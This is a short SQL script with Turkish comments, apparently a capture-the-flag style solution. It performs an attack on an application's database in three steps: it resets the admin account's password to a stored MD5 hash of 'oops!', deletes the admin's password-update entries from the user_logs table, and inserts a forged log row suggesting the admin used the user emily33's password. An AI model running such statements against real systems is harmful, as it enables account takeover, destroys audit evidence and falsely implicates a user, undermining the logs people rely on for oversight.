-- 1. admin hesabının şifresini "oops!" olarak değiştir (hash: 982c0381c279d139fd221fce974916e7)
UPDATE users
SET password = '982c0381c279d139fd221fce974916e7'
WHERE username = 'admin';

-- 2. admin'e ait şifre güncelleme loglarını sil
DELETE FROM user_logs
WHERE new_username = 'admin'
AND type = 'update';

-- 3. admin sanki emily33'nin şifresini kullanmış gibi sahte kayıt ekle
INSERT INTO user_logs (type, old_username, new_username, old_password, new_password)
SELECT
    'update',
    'admin',
    'admin',
    NULL,
    password
FROM users
WHERE username = 'emily33';
